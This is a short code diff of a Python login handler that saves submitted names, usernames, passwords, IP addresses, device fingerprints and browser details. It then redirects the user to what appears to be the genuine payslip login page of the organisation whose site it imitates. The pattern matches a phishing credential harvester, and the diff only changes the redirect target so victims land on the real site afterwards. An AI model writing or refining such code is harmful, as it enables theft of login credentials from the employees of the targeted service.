@@ -269,7 +269,7 @@ def login():
     save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
     
     # Redirect to external site
-    return redirect("https://payslip-pnppms.onrender.com/")
+    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")
 
 def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
     """ 
